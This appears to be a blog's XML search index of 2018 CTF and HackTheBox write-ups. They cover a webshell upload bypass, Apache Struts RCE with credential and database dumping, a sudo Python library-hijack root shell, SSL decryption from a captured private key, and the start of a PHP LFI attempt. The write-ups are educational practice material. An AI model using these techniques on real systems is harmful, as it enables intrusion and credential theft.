<?xml version="1.0" encoding="utf-8"?>
<search>
  
    <entry>
      <title><![CDATA[noxCTF - MyFileUploader]]></title>
      <url>/2018/09/09/noxCTF-Write-Up-MyFileUploader/</url>
      <content type="text"><![CDATA[ChallengeThis is my new file uploader server. I bet you can’t hack it!http://chal.noxale.com:8079[200 points]Initial thoughtsWell, I bet I can. We are presented with a very basic uploading webpage as you can see :Let’s go ahead and try to upload this very cute, basic .jpg picture :Works. And as we can see, it also gives us the path where we can find this picture on the server : http://chal.noxale.com:8079/uploads/kittens.jpgBefore exploring this path, let’s try to upload a very simple webshell named shell.php. It is actually Arrexel’s script, as I find it very handy.Nope. Doesn’t want it, not surprisingly. After I tried different things, I understood I only needed to put .png, .jpg or .gif anywhere in the name of the file. So the server would still take evilshell.jpg.php as a valid input, but it would automatically erase .php if present at the end of the filename. That was a problem.Then I went to explore the path /uploads and I found a directory called “Don’t open”. Guess what? I opened it.Inside was lying a .htaccess file with a very interesting content :Options +IndexesAddType application/x-httpd-php .cyb3rThis means that any file ending with the home-made extension .cyb3r will be processed by the server as php code. Nice.It was actually pretty straight forward after that.ExploitationLet’s take our phpbash shell and rename it to shell.png.cyb3r, then upload it.Worked! The moment of truth now… Let’s navigate to our upload’s path and…Yep! Got a webshell, thanks to Arrexel. :smile:Now let’s just list what’s inside this exciting “7H3-FL4G-1S-H3r3” folder :Flagged : noxCTF{N3V3R_7RU57_07H3R5}After thoughtsInteresting use of .htaccess which I never heard about before. Also, felt nice to use Arrexel’s script again.]]></content>
      <categories>
        
      </categories>
      <tags>
        
          <tag> write-up </tag>
        
          <tag> noxctf-2018 </tag>
        
          <tag> web </tag>
        
      </tags>
      <tags></tags>
    </entry>
  
    <entry>
      <title><![CDATA[Icectf Write Up Garfeld]]></title>
      <url>/2018/09/09/ICECTF-Write-Up-garfeld/</url>
      <content type="text"><![CDATA[a]]></content>
      <categories>
        
      </categories>
      <tags>
        
      </tags>
      <tags></tags>
    </entry>
  
    <entry>
      <title><![CDATA[HTB - Stratosphere]]></title>
      <url>/2018/09/01/HTB-Stratosphere/</url>
      <content type="text"><![CDATA[Target10.10.10.64LinuxUser : 15 pointsRoot : 30 pointsEnumerationLet’s do an nmap :NSE: Loaded 148 scripts for scanning.NSE: Script Pre-scanning.Initiating NSE at 10:02Completed NSE at 10:02, 0.00s elapsedInitiating NSE at 10:02Completed NSE at 10:02, 0.00s elapsedInitiating Ping Scan at 10:02Scanning 10.10.10.64 [4 ports]Completed Ping Scan at 10:02, 0.08s elapsed (1 total hosts)Initiating Parallel DNS resolution of 1 host. at 10:02Completed Parallel DNS resolution of 1 host. at 10:02, 0.00s elapsedInitiating SYN Stealth Scan at 10:02Scanning 10.10.10.64 [1000 ports]Discovered open port 22/tcp on 10.10.10.64Discovered open port 8080/tcp on 10.10.10.64Discovered open port 80/tcp on 10.10.10.64Completed SYN Stealth Scan at 10:03, 9.43s elapsed (1000 total ports)Initiating Service scan at 10:03Scanning 3 services on 10.10.10.64Completed Service scan at 10:03, 16.20s elapsed (3 services on 1 host)Initiating OS detection (try #1) against 10.10.10.64Retrying OS detection (try #2) against 10.10.10.64Initiating Traceroute at 10:03Completed Traceroute at 10:03, 0.03s elapsedInitiating Parallel DNS resolution of 2 hosts. at 10:03Completed Parallel DNS resolution of 2 hosts. at 10:03, 0.00s elapsedNSE: Script scanning 10.10.10.64.Initiating NSE at 10:03Completed NSE at 10:03, 2.75s elapsedInitiating NSE at 10:03Completed NSE at 10:03, 0.00s elapsedNmap scan report for 10.10.10.64Host is up (0.021s latency).Not shown: 997 filtered portsPORT     STATE SERVICE    VERSION22/tcp   open  ssh        OpenSSH 7.4p1 Debian 10+deb9u2 (protocol 2.0)| ssh-hostkey: |   2048 5b:16:37:d4:3c:18:04:15:c4:02:01:0d:db:07:ac:2d (RSA)|   256 e3:77:7b:2c:23:b0:8d:df:38:35:6c:40:ab:f6:81:50 (ECDSA)|_  256 d7:6b:66:9c:19:fc:aa:66:6c:18:7a:cc:b5:87:0e:40 (ED25519)80/tcp   open  http| fingerprint-strings: |   FourOhFourRequest: |     HTTP/1.1 404 |     Content-Type: text/html;charset=utf-8|     Content-Language: en|     Content-Length: 1114|     Date: Sat, 25 Aug 2018 08:03:08 GMT|     Connection: close|     &lt;!doctype html&gt;&lt;html lang="en"&gt;&lt;head&gt;&lt;title&gt;HTTP Status 404 |     Found&lt;/title&gt;&lt;style type="text/css"&gt;h1 {font-family:Tahoma,Arial,sans-serif;color:white;background-color:#525D76;font-size:22px;} h2 {font-family:Tahoma,Arial,sans-serif;color:white;background-color:#525D76;font-size:16px;} h3 {font-family:Tahoma,Arial,sans-serif;color:white;background-color:#525D76;font-size:14px;} body {font-family:Tahoma,Arial,sans-serif;color:black;background-color:white;} b {font-family:Tahoma,Arial,sans-serif;color:white;background-color:#525D76;} p {font-family:Tahoma,Arial,sans-serif;background:white;color:black;font-size:12px;} a {color:black;} a.name {color:black;} .line {height:1px;background-color:#525D76;border:none;}&lt;/style&gt;&lt;/head&gt;&lt;body&gt;|   GetRequest: |     HTTP/1.1 200 |     Accept-Ranges: bytes|     ETag: W/"1708-1519762495000"|     Last-Modified: Tue, 27 Feb 2018 20:14:55 GMT|     Content-Type: text/html|     Content-Length: 1708|     Date: Sat, 25 Aug 2018 08:03:08 GMT|     Connection: close|     &lt;!DOCTYPE html&gt;|     &lt;html&gt;|     &lt;head&gt;|     &lt;meta charset="utf-8"/&gt;|     &lt;title&gt;Stratosphere&lt;/title&gt;|     &lt;link rel="stylesheet" type="text/css" href="main.css"&gt;|     &lt;/head&gt;|     &lt;body&gt;|     &lt;div id="background"&gt;&lt;/div&gt;|     &lt;header id="main-header" class="hidden"&gt;|     &lt;div class="container"&gt;|     &lt;div class="content-wrap"&gt;|     &lt;p&gt;&lt;i class="fa fa-diamond"&gt;&lt;/i&gt;&lt;/p&gt;|     &lt;nav&gt;|     class="btn" href="GettingStarted.html"&gt;Get started&lt;/a&gt;|     &lt;/nav&gt;|     &lt;/div&gt;|     &lt;/div&gt;|     &lt;/header&gt;|     &lt;section id="greeting"&gt;|     &lt;div class="container"&gt;|     &lt;div class="content-wrap"&gt;|     &lt;h1&gt;Stratosphere&lt;br&gt;We protect your credit.&lt;/h1&gt;|     class="btn" href="GettingStarted.html"&gt;Get started now&lt;/a&gt;|     &lt;p&gt;&lt;i class="ar|   HTTPOptions: |     HTTP/1.1 200 |     Allow: GET, HEAD, POST, PUT, DELETE, OPTIONS|     Content-Length: 0|     Date: Sat, 25 Aug 2018 08:03:08 GMT|     Connection: close|   RTSPRequest, X11Probe: |     HTTP/1.1 400 |     Transfer-Encoding: chunked|     Date: Sat, 25 Aug 2018 08:03:08 GMT|_    Connection: close| http-methods: |   Supported Methods: GET HEAD POST PUT DELETE OPTIONS|_  Potentially risky methods: PUT DELETE|_http-title: Stratosphere8080/tcp open  http-proxy| fingerprint-strings: |   FourOhFourRequest: |     HTTP/1.1 404 |     Content-Type: text/html;charset=utf-8|     Content-Language: en|     Content-Length: 1114|     Date: Sat, 25 Aug 2018 08:03:08 GMT|     Connection: close|     &lt;!doctype html&gt;&lt;html lang="en"&gt;&lt;head&gt;&lt;title&gt;HTTP Status 404 |     Found&lt;/title&gt;&lt;style type="text/css"&gt;h1 {font-family:Tahoma,Arial,sans-serif;color:white;background-color:#525D76;font-size:22px;} h2 {font-family:Tahoma,Arial,sans-serif;color:white;background-color:#525D76;font-size:16px;} h3 {font-family:Tahoma,Arial,sans-serif;color:white;background-color:#525D76;font-size:14px;} body {font-family:Tahoma,Arial,sans-serif;color:black;background-color:white;} b {font-family:Tahoma,Arial,sans-serif;color:white;background-color:#525D76;} p {font-family:Tahoma,Arial,sans-serif;background:white;color:black;font-size:12px;} a {color:black;} a.name {color:black;} .line {height:1px;background-color:#525D76;border:none;}&lt;/style&gt;&lt;/head&gt;&lt;body&gt;|   GetRequest: |     HTTP/1.1 200 |     Accept-Ranges: bytes|     ETag: W/"1708-1519762495000"|     Last-Modified: Tue, 27 Feb 2018 20:14:55 GMT|     Content-Type: text/html|     Content-Length: 1708|     Date: Sat, 25 Aug 2018 08:03:08 GMT|     Connection: close|     &lt;!DOCTYPE html&gt;|     &lt;html&gt;|     &lt;head&gt;|     &lt;meta charset="utf-8"/&gt;|     &lt;title&gt;Stratosphere&lt;/title&gt;|     &lt;link rel="stylesheet" type="text/css" href="main.css"&gt;|     &lt;/head&gt;|     &lt;body&gt;|     &lt;div id="background"&gt;&lt;/div&gt;|     &lt;header id="main-header" class="hidden"&gt;|     &lt;div class="container"&gt;|     &lt;div class="content-wrap"&gt;|     &lt;p&gt;&lt;i class="fa fa-diamond"&gt;&lt;/i&gt;&lt;/p&gt;|     &lt;nav&gt;|     class="btn" href="GettingStarted.html"&gt;Get started&lt;/a&gt;|     &lt;/nav&gt;|     &lt;/div&gt;|     &lt;/div&gt;|     &lt;/header&gt;|     &lt;section id="greeting"&gt;|     &lt;div class="container"&gt;|     &lt;div class="content-wrap"&gt;|     &lt;h1&gt;Stratosphere&lt;br&gt;We protect your credit.&lt;/h1&gt;|     class="btn" href="GettingStarted.html"&gt;Get started now&lt;/a&gt;|     &lt;p&gt;&lt;i class="ar|   HTTPOptions: |     HTTP/1.1 200 |     Allow: GET, HEAD, POST, PUT, DELETE, OPTIONS|     Content-Length: 0|     Date: Sat, 25 Aug 2018 08:03:08 GMT|     Connection: close|   RTSPRequest: |     HTTP/1.1 400 |     Transfer-Encoding: chunked|     Date: Sat, 25 Aug 2018 08:03:08 GMT|_    Connection: close| http-methods: |   Supported Methods: GET HEAD POST PUT DELETE OPTIONS|_  Potentially risky methods: PUT DELETE|_http-open-proxy: Proxy might be redirecting requests|_http-title: StratosphereWarning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed portAggressive OS guesses: Linux 3.10 - 4.11 (92%), Linux 3.12 (92%), Linux 3.13 (92%), Linux 3.13 or 4.2 (92%), Linux 3.16 - 4.6 (92%), Linux 3.2 - 4.9 (92%), Linux 3.8 - 3.11 (92%), Linux 4.2 (92%), Linux 4.4 (92%), Linux 3.16 (90%)No exact OS matches for host (test conditions non-ideal).Uptime guess: 0.093 days (since Sat Aug 25 07:48:51 2018)Network Distance: 2 hopsTCP Sequence Prediction: Difficulty=258 (Good luck!)IP ID Sequence Generation: All zerosService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernelTRACEROUTE (using port 22/tcp)HOP RTT      ADDRESS1   20.43 ms 10.10.14.12   20.60 ms 10.10.10.64NSE: Script Post-scanning.Initiating NSE at 10:03Completed NSE at 10:03, 0.00s elapsedInitiating NSE at 10:03Completed NSE at 10:03, 0.00s elapsedRead data files from: /usr/bin/../share/nmapOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 34.08 seconds           Raw packets sent: 3086 (139.530KB) | Rcvd: 62 (5.400KB)Alright, so this is a webserver. Let’s check it out and run a nikto on it.~# nikto -h http://10.10.10.64/- Nikto v2.1.6---------------------------------------------------------------------------+ Target IP:          10.10.10.64+ Target Hostname:    10.10.10.64+ Target Port:        80+ Start Time:         2018-08-25 10:06:18 (GMT2)---------------------------------------------------------------------------+ Server: No banner retrieved+ Server leaks inodes via ETags, header found with file /, fields: 0xW/1708 0x1519762495000 + The anti-clickjacking X-Frame-Options header is not present.+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type+ No CGI Directories found (use '-C all' to force check all possible dirs)+ Allowed HTTP Methods: GET, HEAD, POST, PUT, DELETE, OPTIONS + OSVDB-397: HTTP method ('Allow' Header): 'PUT' method could allow clients to save files on the web server.+ OSVDB-5646: HTTP method ('Allow' Header): 'DELETE' may allow clients to remove files on the web server.+ /manager/html: Default Tomcat Manager / Host Manager interface found+ /host-manager/html: Default Tomcat Manager / Host Manager interface found+ /manager/status: Default Tomcat Server Status interface found+ 7801 requests: 0 error(s) and 10 item(s) reported on remote host+ End Time:           2018-08-25 10:10:01 (GMT2) (223 seconds)---------------------------------------------------------------------------+ 1 host(s) testedQuite a few information there already. Unfortunately, after spending a few minutes spent trying to get into that Tomcat, with no success, I tried a gobuster, which also found /manager but with something maybe more interesting.~# gobuster -u http://10.10.10.64/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 20Gobuster v1.4.1              OJ Reeves (@TheColonial)==========================================================================================================[+] Mode         : dir[+] Url/Domain   : http://10.10.10.64/[+] Threads      : 20[+] Wordlist     : /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt[+] Status codes : 302,307,200,204,301=====================================================/manager (Status: 302)/Monitoring (Status: 302)When we go to http://10.10.10.64/Monitoring, we find ourselves redirected to http://10.10.10.64/Monitoring/example/Welcome.action :Never saw this .action extension before. Let’s browse the internet and see what we can come up with against this.Well, let’s try mazen160’s python code first to see if we can get anywhere../struts-pwn.py -u http://10.10.10.64/Monitoring/example/Welcome.action[*] URL: http://10.10.10.64/Monitoring/example/Welcome.action[*] CMD: id[!] ChunkedEncodingError Error: Making another request to the url.Refer to: https://github.com/mazen160/struts-pwn/issues/8 for help.EXCEPTION::::--&gt; ('Connection broken: IncompleteRead(0 bytes read)', IncompleteRead(0 bytes read))Note: Server Connection Closed Prematurelyuid=115(tomcat8) gid=119(tomcat8) groups=119(tomcat8)[%] Done.Aaaand there we go. We now have RCE.Exploitationlsconfdb_connectliblogspolicywebappswork[%] Done.This db_connect file gets me all pump’d up. Let’s find out what’s inside.cat db_connect[ssn]user=ssn_adminpass=AWs64@on*&amp;[users]user=adminpass=admin[%] Done.Looks nice! After I tried getting in through SSH with those creds (and with no luck), I thought that maybe they are some creds for some kind of mysql db, since apache struts needs it?mysql -u admin -p admin -e 'show databases'ERROR[%] Done.This is where I actually got stuck for about an hour. Trying to pass the right command with the right syntax so I could enumerate more and exploit the MySql db. Finally, I stumbled upon this page and more precisely this bit of information:--password[=password], -p[password]The password to use when connecting to the server. If you use the short option form (-p), you cannot have a space between the option and the password. If you omit the password value following the --password or -p option on the command line, mysql prompts for one.Fuck you, MySql. Let’s get back to the exploitation part now that we know how fuck’d up this is.In a nutshell,  we have to put no space between the -p option and the actual password.mysql -u admin -padmin -e 'show databases'Databaseinformation_schemausers[%] Done.There we go! Finally. Let’s see what’s inside, shall we?mysql -u admin -padmin -D users -e 'show tables'Tables_in_usersaccounts[%] Done.Only one table, eh? This should be interesting.mysql -u admin -padmin -D users -e 'select * from accounts'fullName	password	usernameRichard F. Smith	9tc*rhKuG5TyXvUJOrE^5CK7k	richard[%] Done.Oh, oh, motherfucking oh! This looks like pwn’d user to me! Let’s try to SSH in with those creds now.~# sshpass -p '9tc*rhKuG5TyXvUJOrE^5CK7k' ssh richard@10.10.10.64richard@stratosphere:~$ cat user.txt e610b298611fa732fca1665a1c02336brichard@stratosphere:~$ Yep, that was it! User pwn’d, hash was e610b298611fa732fca1665a1c02336b.Privilege escalationFirst things first, a sudo -l as usual.~$ sudo -lMatching Defaults entries for richard on stratosphere:    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/binUser richard may run the following commands on stratosphere:    (ALL) NOPASSWD: /usr/bin/python* /home/richard/test.pyI mean, cmon… This is starting to look easy now. Maybe a library hijacking?Let’s find out by looking inside test.py.1234567891011121314151617181920212223242526272829303132333435363738#!/usr/bin/python3import hashlibdef question():    q1 = input("Solve: 5af003e100c80923ec04d65933d382cb\n")    md5 = hashlib.md5()    md5.update(q1.encode())    if not md5.hexdigest() == "5af003e100c80923ec04d65933d382cb":        print("Sorry, that's not right")        return    print("You got it!")    q2 = input("Now what's this one? d24f6fb449855ff42344feff18ee2819033529ff\n")    sha1 = hashlib.sha1()    sha1.update(q2.encode())    if not sha1.hexdigest() == 'd24f6fb449855ff42344feff18ee2819033529ff':        print("Nope, that one didn't work...")        return    print("WOW, you're really good at this!")    q3 = input("How about this? 91ae5fc9ecbca9d346225063f23d2bd9\n")    md4 = hashlib.new('md4')    md4.update(q3.encode())    if not md4.hexdigest() == '91ae5fc9ecbca9d346225063f23d2bd9':        print("Yeah, I don't think that's right.")        return    print("OK, OK! I get it. You know how to crack hashes...")    q4 = input("Last one, I promise: 9efebee84ba0c5e030147cfd1660f5f2850883615d444ceecf50896aae083ead798d13584f52df0179df0200a3e1a122aa738beff263b49d2443738eba41c943\n")    blake = hashlib.new('BLAKE2b512')    blake.update(q4.encode())    if not blake.hexdigest() == '9efebee84ba0c5e030147cfd1660f5f2850883615d444ceecf50896aae083ead798d13584f52df0179df0200a3e1a122aa738beff263b49d2443738eba41c943':        print("You were so close! urg... sorry rules are rules.")        return    import os    os.system('/root/success.py')    returnquestion()Yeah, no… I ain’t going to answer all those questions, pal. I’d rather hijack this pretty hashlib library of yours.For those of you who don’t know how this whole hijacking works, check this out.Let’s continue : I created a hashlib.py file in the same directory as this test.py script and added a single line in it.import pty; pty.spawn("/bin/bash")Ready to see the magic?~$ sudo python /home/richard/test.pyroot@stratosphere:/home/richard# iduid=0(root) gid=0(root) groups=0(root)root@stratosphere:/home/richard# cat /root/root.txtd41d8cd98f00b204e9800998ecf8427eAaaand that’s it! Root pwn’d. Hash was : d41d8cd98f00b204e9800998ecf8427eAfter thoughtsVery nice box with new elements in it such as the Apache Struts exploitation. I already did a few libraries hijacking and the rest of it (enumeration, gobuster, sudo -l) was pretty easy. If I need to be really honest, what took me the most time on this machine was actually MySql’s fucked up syntax!]]></content>
      <categories>
        
      </categories>
      <tags>
        
          <tag> hackthebox </tag>
        
          <tag> write-up </tag>
        
          <tag> linux-box </tag>
        
      </tags>
      <tags></tags>
    </entry>
  
    <entry>
      <title><![CDATA[CODEFESTCTF18 - Typing Master]]></title>
      <url>/2018/09/01/CODEFEST-Typing-Master/</url>
      <content type="text"><![CDATA[ChallengeIf you think you have it in you, connect now to 34.216.132.109 9093 and prove your mettle.You will be presented with a simple typing task which is meant to check your typing speed.For example, Can you type ‘Z’ 10 times followed by ‘u’ 6 times, followed by the sum of their ASCII values?ZZZZZZZZZZuuuuuu207[50 points]Written by rahul_manpurInitial thoughtsI was very glad that CODEFESTCTF18 had this kind of challenge because I was really looking forward to writing my first Python (3) script. A script that would have to read text from an incoming connection, complete some  operations on it and then return another text.It was clearly the case here, so without further ado, let’s dive in!ExploitationLet’s first try to connect through netcat and see what comes back.# nc 34.216.132.109 9093Give me 'L' 475 times followed by 'n' 260 times, followed by the sum of their ASCII values.This connection will close in 10 secs ;) You gotta be fassssssssst :DNow let’s wait ten seconds to see if the connection really closes up, and if it tells us something when doing so.# nc 34.216.132.109 9093Give me 'L' 475 times followed by 'n' 260 times, followed by the sum of their ASCII values.This connection will close in 10 secs ;) You gotta be fassssssssst :D Take help from your typewriter friend :) You seem too slowYes it does! Now let’s try to give it a wrong input to see if anything yells at us.# nc 34.216.132.109 9093Can you type 'W' 410 times followed by 'q' 221 times, along with the sum of their ASCII values.This connection will close in 10 secs ;) You gotta be fassssssssst :D supLooks like you make mistakes!Alright. We can see that the letters and numbers are changing from one connection to another, but the sentences doesn’t seem to, which will make our string work easier. Let’s send a couple more requests just to be sure.# nc 34.216.132.109 9093I want 'P' 339 times followed by 'z' 151 times, followed by the sum of their ASCII values.This connection will close in 10 secs ;) You gotta be fassssssssst :D Ah, ah! Seems like the sentence changes after all. I see that the letters are surrounded by this character : '. I’ll build my code on that. Let’s start coding, shall we?12345import socketsocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)socket.connect(('34.216.132.109', 9093))data = str(socket.recv(1024))This bit connects to the distant server and stores the data it gives us in the data variable. Now, I need to check for the ' character and go on from there.1234567891011conteneur = []counter = 0charcounter = 0for char in data:	if char == "'" and charcounter % 2 == 0:		conteneur.append(data[counter+1])		conteneur.append(data[counter+4:counter+7])		charcounter +=1	elif char == "'":		charcounter += 1	counter += 1This little piece of code returns just what we want inside the conteneur variable : i.e. ['N', '364', 'r', '296'].Now, we need to assign each conteneur value to variables, and then we need to make the multiplications as asked in the sentence. Finally, we need to append the ASCII value of character one plus character two.12345678lettreun = str(conteneur[0])lettredeux = str(conteneur[2])chiffreun = int(conteneur[1])chiffredeux = int(conteneur[3])ascvallettreun = ord(lettreun)ascvallettredeux = ord(lettredeux)somme = ascvallettreun + ascvallettredeuxback = lettreun*chiffreun+lettredeux*chiffredeux+str(somme)+'\n'That’s it! Back takes the value we need it to. Here is what is printed i.e. : DDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDoooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooo179Note : I added \n at the end of the string because, in order to trigger the server to take our input, I had to simulate a “press enter” action.Now what’s left for us is to send this data back, after we had encoded it back to bytes, and read any return we might get!12345backbytes = str.encode(back)socket.send(backbytes)data2 = str(socket.recv(2048))print(data2[2:-1])socket.close()And here is the fully working script :1234567891011121314151617181920212223242526272829303132333435#!/usr/bin/python3import socketsocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)socket.connect(('34.216.132.109', 9093))data = str(socket.recv(1024))conteneur = []counter = 0charcounter = 0for char in data:	if char == "'" and charcounter % 2 == 0:		conteneur.append(data[counter+1])		conteneur.append(data[counter+4:counter+7])		charcounter +=1	elif char == "'":		charcounter += 1	counter += 1lettreun = str(conteneur[0])lettredeux = str(conteneur[2])chiffreun = int(conteneur[1])chiffredeux = int(conteneur[3])ascvallettreun = ord(lettreun)ascvallettredeux = ord(lettredeux)somme = ascvallettreun + ascvallettredeuxback = lettreun*chiffreun+lettredeux*chiffredeux+str(somme)+'\n'backbytes = str.encode(back)socket.send(backbytes)data2 = str(socket.recv(2048))print(data2[2:-1])socket.close()Let’s finally run it and see what we get…:# ./script.py The flag is: CodefestCTF{1_s33_y0u_4r3_a_m4n_0f_sp33d}Here we go! Flag was : CodefestCTF{1_s33_y0u_4r3_a_m4n_0f_sp33d}After thoughtsI understand this is considered a very basic challenge for many of you, but as you’ll be able to tell from my Python code, I’m a beginner at this. In fact, I know my code is far from perfect after having shared it with other members of the rawsec CTF team, and getting to see their codes.In any case, I think it’s important to start somewhere, and I didn’t expect to write perfect code the first time. I’m just glad it worked out and I was able to get some satisfaction from this challenge!I also need to get familiar with Python’s pwn library. I saw a lot of members using it for many challenges, and it seems to make things much easier when it comes to sockets, network connections, and more.]]></content>
      <categories>
        
      </categories>
      <tags>
        
          <tag> write-up </tag>
        
          <tag> codefestctf18 </tag>
        
          <tag> programming </tag>
        
          <tag> python </tag>
        
      </tags>
      <tags></tags>
    </entry>
  
    <entry>
      <title><![CDATA[TJCTF - Ssleepy]]></title>
      <url>/2018/08/23/TJCTF-Write-Up-Ssleepy/</url>
      <content type="text"><![CDATA[ChallengeI found this super suspicious transmission lying around on the floor. What could be in it?[70 points]Written by Alaska47Initial thoughtsWe find ourselves alone with a .pcapng file. Let’s dig in and see if we can find the needle in the haystack. PCAP-based challenges can be either very fun or very boring and discouraging… As with forensics in general.ExploitationAs soon as we fire up Wireshark, we see a clear communication between a client and an FTP server. Wireshark lets us see everything that’s happening.And so we know the client retrieved a file called key.zip from the FTP server. Well… Let’s get it.Select the packet, select the sub-section FTP DATA and right click on it. Then select “Export Packet bytes…” and save it as whatever.zip. Wireshark magic, eh? :smile:Alright now. Let’s unzip this baby and see what’s inside.# file key.zip key.zip: Zip archive data, at least v2.0 to extract# unzip key.zip Archive:  key.zipwarning:  skipped "../" path component(s) in ../user/ftp/files/private/server_key.pem  inflating: user/ftp/files/private/server_key.pem  # cat user/ftp/files/private/server_key.pem -----BEGIN RSA PRIVATE KEY-----MIICXQIBAAKBgQDJ3egkT4J5h4klOdnXiPB8wra4dFMZXPYZk3NWBYmlu5ImhMg7Iao7qrv/rNe4SNN/vbTLmuo/BJ0/L5O1QDYaZMFt63tFnhTjMWPAtx7uUGBJ+JZkPobNutrv463/tlTV0yvncL0x6Epapgtrur1b8vAl60nqcBFLxQ6EUGEUpQIDAQABAoGBAIywHnkn/MwMPPX30q4Xn1ukLMpzL/MuScpbbHeYVm1uQ5aa1h34AXeiL3IqmRGzl8uggF+icP1IjvsZgn1A6jLOATCKhmaoEldHj4OciaGpys3InFkY8sqlgjV+OHwbYYVt7a3hrcphN6I5nUAbK8VXz7ne3r3PwN6DIubqfeMhAkEA/nPdOGK3CgdxvpTHnEK39XwWHOjDJURTsW78KNo1sqQbDYhGQAAlvXNoClz4dpjoVCxkIuHZ3zMC+5IrKW0KaQJBAMsYLSGyM2WCl9NAcQ2l9lFQ1matTNy6cFmZckRv15nrF/X2mrtMBqyxJAY/rw/FjEoQde30kWr4ZrpbI7DzWN0CQQD8Km7t1kZ3VfFPYbqADU6ppZN0iuf6IsCectLK2ZWluCRnQMn92yeLnLdardA+GEMGSAfk2dZE8BTgo3bK0xkhAkBUX9/oHtuBcabXye7t56QUlkvsblT/YqloX/p7+icNOAFFW0VfSK+BMTqxKeX13HFzF7GWwUNkuHwdMd37Fq41AkBJC0pZtkbzdUzwZre8XylK8rI62xJUUdOmyowaSmi/vEJTGtlc2+b5ztlsYjzsPFaI49fw8QNawtZj1e3CRc7w-----END RSA PRIVATE KEY-----We’ve got a private RSA key! Useful for, let’s say… Decrypt SSL? What was the name of this challenge again? Sleepy? Or… SSLeepy?Let’s take a look at what went on after this FTP transaction in the pcapng. Uh, unfortunately, it’s all encrypted by SSL. Luckily, we have the key to the dungeon now.Let’s click Edit on Wireshark’s menu, then Preferences, then Protocols, then SSL, then RSA keys list, and add one, shall we?Set the IP to 10.142.0.3 as seen in the pcap, set the server_key.pem we extracted earlier, and port 443. Save and quit.Oh, look! We can now see decrypted SSL data on some new tabs at the bottom of Wireshark! Magic intensifiesSeems like a flag.jpg was requested over a web server. Let’s follow the SSL stream to get our flag!Just save it as raw data to a file called, let’s say, wu.jpg.Err… We have a problem now :# file wu.jpg wu.jpg: dataIt’s not recognized as a jpeg file because there is some shit before the magic bytes!We shall erase every byte that precedes FF D8 FF DB.Save it, now open the jpeg with your favourite software that can open images.Got it! Flag is : tjctf{wireshark_or_sharkwire?}After thoughtsThis was one of the few forensics challenges I actually enjoyed. It wasn’t quick and easy, it wasn’t overly complicated, but overall, it taught me things about Wireshark. And that’s priceless. Also reminded me to always look for magic bytes, so… Yeah, there’s that.Special mention for Alaska47 who made it so an HTTP request to /sharkwire_or_wireshark was made a little before the flag.jpg request, the loomy bastard! :heart:]]></content>
      <categories>
        
      </categories>
      <tags>
        
          <tag> tjctf-2018 </tag>
        
          <tag> write-up </tag>
        
          <tag> forensics </tag>
        
      </tags>
      <tags></tags>
    </entry>
  
    <entry>
      <title><![CDATA[TJCTF - Programmable Hyperlinked Pasta]]></title>
      <url>/2018/08/22/TJCTF-Programmable-Hyperlinked-Pasta/</url>
      <content type="text"><![CDATA[ChallengeCheck out my new site! PHP is so cool!programmable_hyperlinked_pasta.tjctf.org[60 points]Written by nthistleInitial thoughtsI mean… Cmon, it’s pretty funny, right?Probably have to deal with PHP anyway, so… Better laugh about it!ExploitationLet’s take a look at this website.What a nice web page! Oh, and look : we can display it… In spanish! How nice of them.When we display it in spanish, we can see that something gets added to the URL :https://programmable_hyperlinked_pasta.tjctf.org/?lang=es.phpInteresting. Let’s take a look at the source code now.1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465&lt;html&gt;&lt;head&gt;    &lt;title&gt; El Sitio de Neil! &lt;/title&gt;    &lt;style&gt;body {    background-color: #99ccff;}#main-block {    position: fixed;    height: 100%;    width: 56%;    left: 20%;    top: 0;    padding-left: 2%;    padding-right: 2%;    padding-top: 15px;    background-color: #ffffff;}#footer {    position: fixed;    bottom: 0;    left: 0;    padding-left: 5px;    padding-right: 5px;    padding-top: 10px;    padding-bottom: 5px;    width: 100%;    height: 20px;    background-color: #cccccc;}.center {    display: block;    margin-left: auto;    margin-right: auto;    text-align: center;}    &lt;/style&gt;&lt;/head&gt;&lt;body&gt;&lt;div id="main-block"&gt;    &lt;h1&gt; El Sitio de Neil! &lt;/h1&gt;    &lt;p&gt;        Mi nombre es Neil, y esto es mi sitio. Trabajo aqui con mis amigos Evan y Aneesh. Todo aquí tiene un cuento y un precio. Una cosa que he aprendido después de 18 años - nunca sabe que necesita hacer para obtener esa bandera.    &lt;/p&gt;    &lt;!-- &lt;a href="flag.txt"&gt;Here's a flag!&lt;/a&gt; --&gt;    &lt;br /&gt;    &lt;div class="center"&gt;    &lt;img src="evanshi-es.png" class="center" width=100 /&gt;    &lt;br /&gt;    Esto es Evan.    &lt;/div&gt;&lt;/div&gt;&lt;div id="footer"&gt;    Ahora en &lt;a href="?lang=en-us.php"&gt;Inglés!&lt;/a&gt;&lt;/div&gt;&lt;/body&gt;&lt;/html&gt;As you can see line 53, there is a flag.txt somewhere on this web server.Maybe, as we have seen before, we could get LFI using the lang parameter, since it calls for a .php file…Let’s try https://programmable_hyperlinked_pasta.tjctf.org/?lang=flag.txt :No luck. Well, let’s try 